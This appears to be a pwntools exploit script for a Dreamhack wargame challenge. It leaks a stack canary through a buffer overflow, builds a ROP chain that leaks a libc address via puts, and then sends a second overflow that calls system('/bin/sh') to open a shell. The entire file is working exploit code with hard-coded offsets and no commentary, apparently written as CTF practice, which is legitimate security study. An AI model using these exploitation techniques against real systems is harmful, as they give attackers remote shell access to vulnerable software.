from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8367
r = remote(HOST, PORT)

r.sendlineafter(b': ', b'A' * 56)
r.recvline()
canary = u64(r.recvline()[:7].strip().ljust(8, b'\x00')) << 8

puts_plt = 0x4005b0
puts_got = 0x601018
pop_rdi = 0x400853
main = 0x4006f7
ret = 0x400596

r.sendlineafter(b': ', b'A' * 56 + p64(canary) + b'A' * 8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main))

libc_puts = u64(r.recvline().strip().ljust(8, b'\x00'))
libc = libc_puts - 0x80ed0
pop_rsi = libc + 0x2be51
system = libc + 0x50d60
binsh = libc + 0x1d8698

r.sendlineafter(b': ', b'')
r.sendlineafter(b': ', b'A' * 56 + p64(canary) + b'A' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(pop_rsi) + p64(0) + p64(system))

r.interactive()